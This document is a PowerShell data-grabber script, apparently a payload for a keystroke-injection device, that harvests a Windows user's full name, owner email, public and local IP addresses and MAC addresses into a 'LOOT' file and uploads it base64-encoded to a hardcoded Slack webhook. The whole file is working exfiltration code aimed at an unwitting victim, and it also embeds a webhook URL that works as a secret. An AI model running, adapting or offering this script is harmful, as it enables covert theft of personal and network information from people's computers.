$FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"

#------------------------------------------------------------------------------------------------------------------------------------
# URL : https://tinyurl.com/grabber3

function Get-FullName {

    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
    catch {
        Write-Error "No name was detected"
        return $env:UserName
    }

    return $fullName 
}

$fullName = Get-FullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-Email {
    
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    }
    catch {
        Write-Error "An email was not found"
        return "No Email Detected"
    }        
}

$email = Get-Email

#------------------------------------------------------------------------------------------------------------------------------------

try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
}
catch {
    $computerPubIP = "Error getting Public IP"
}

$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*", "*Wi-Fi*" -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixOrigin | Out-String

$MAC = Get-NetAdapter -Name "*Ethernet*", "*Wi-Fi*" | Select-Object Name, MacAddress, Status | Out-String

#------------------------------------------------------------------------------------------------------------------------------------

$output = @"
Full Name: $fullName

Email: $email

------------------------------------------------------------------------------------------------------------------------------
Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC
"@

$output > $FileName

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Slack {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $webhookUrl = "https://hooks.slack.com/services/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"

    $payload = @{
        'text' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'application/json' -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        $fileBytes = [System.IO.File]::ReadAllBytes($file)
        $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
        $fileName = [System.IO.Path]::GetFileName($file)

        $filePayload = @{
            'file' = $fileBase64
            'filename' = $fileName
        }

        $fileJson = $filePayload | ConvertTo-Json

        Invoke-RestMethod -ContentType 'application/json' -Uri $webhookUrl -Method Post -Body $fileJson
    }
}

if (-not ([string]::IsNullOrEmpty($dc))) {
    Upload-Slack -file "$FileName"
}
